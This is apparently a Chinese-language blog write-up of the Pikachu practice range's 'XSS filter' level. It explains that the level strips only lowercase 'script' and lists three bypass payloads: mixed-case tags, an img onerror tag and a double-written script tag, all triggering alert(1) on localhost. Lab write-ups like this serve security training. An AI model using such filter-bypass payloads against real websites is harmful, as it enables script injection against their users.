---
title: Pikachu XSS-XSS之过滤
date: 2026-10-25
categories: [Pikachu]
tags: [Pikachu, Web, XSS, XSS过滤绕过]
---

## 靶场地址
`http://127.0.0.1/pikachu/vul/xss/xss_01.php`

## 漏洞简介
本关卡对 `<script>` 关键字做了简单的过滤，会直接删除小写的script字符串。过滤逻辑不完善，可以通过多种方式绕过，实现XSS。

## 漏洞原理
后端使用简单正则匹配，仅过滤小写script，没有统一做HTML转义，因此大小写、其他标签、双写都可以绕过过滤。

## 复现步骤
1. 访问XSS之过滤页面
2. 输入Payload：`<ScRiPt>alert(1)</ScRiPt>`
3. 点击submit提交，页面弹出alert弹窗，验证成功

## Payload
html
<ScRiPt>alert(1)</ScRiPt>
< img src=x onerror=alert(1)>
<scri<script>pt>alert(1)</scri</script>pt>

## 结果

绕过script关键字过滤，成功弹窗。
